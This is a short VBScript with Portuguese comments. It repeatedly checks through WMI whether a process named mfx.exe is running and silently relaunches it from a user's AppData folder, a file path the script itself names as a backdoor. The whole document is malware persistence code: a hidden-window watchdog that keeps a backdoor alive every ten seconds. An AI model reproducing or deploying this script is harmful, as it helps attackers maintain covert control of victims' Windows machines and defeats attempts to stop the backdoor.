Dim objShell, objWMIService, colProcesses
Dim processName, backdoorPath, delay

' Configuração
processName = "mfx.exe" ' 
backdoorPath = "C:\Users\%username%\AppData\Roaming\metas\mfx.exe" ' 
delay = 10000 ' 

Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

Do
    ' Verifica se o processo está ativo
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    If colProcesses.Count = 0 Then
        ' 
        objShell.Run Chr(34) & backdoorPath & Chr(34), 0, False
    End If
    ' 
    WScript.Sleep delay
Loop
